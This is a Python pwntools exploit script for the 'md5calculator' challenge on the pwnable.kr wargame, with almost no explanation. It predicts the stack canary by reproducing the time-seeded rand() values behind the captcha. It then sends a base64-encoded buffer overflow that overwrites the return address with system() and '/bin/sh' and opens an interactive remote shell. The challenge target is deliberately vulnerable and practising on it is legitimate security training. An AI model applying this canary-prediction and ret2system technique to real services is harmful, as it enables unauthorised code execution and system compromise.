#!/usr/bin/env python3

from pwn import *
import time
import base64
from ctypes import CDLL

elf = ELF("./md5calculator")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break *0x0804902b
break *0x0804908e
'''

domain= "pwnable.kr"
port = 9002

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================

# -- Grab the stack cookie --
RAND_MAX = 2**31-1
seed = int(time.time())
so = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
so.srand(seed)

numbers = []
for _ in range(8):
    numbers.append(so.rand() % (RAND_MAX + 1))

r.recvuntil(b"Are you human? input captcha : ")
sum = int(r.recvline().strip())

stack_cookie = sum - numbers[5] - numbers[1] - (numbers[2] - numbers[3]) - numbers[7] - (numbers[4] - numbers[6])

log.success("Predicted stack_cookie: {}".format(hex(stack_cookie & 0xFFFFFFFF)))

r.sendline(str(sum).encode())

# -- system("/bin/sh")
payload = b"A"*512 + p32(stack_cookie & 0xFFFFFFFF) + b"B"*12
payload += p32(elf.sym.system) + p32(0) + p32(0x0804b0e0 + 720)
payload = base64.b64encode(payload)

payload += b"/bin/sh\x00"

r.sendline(payload)
r.interactive()

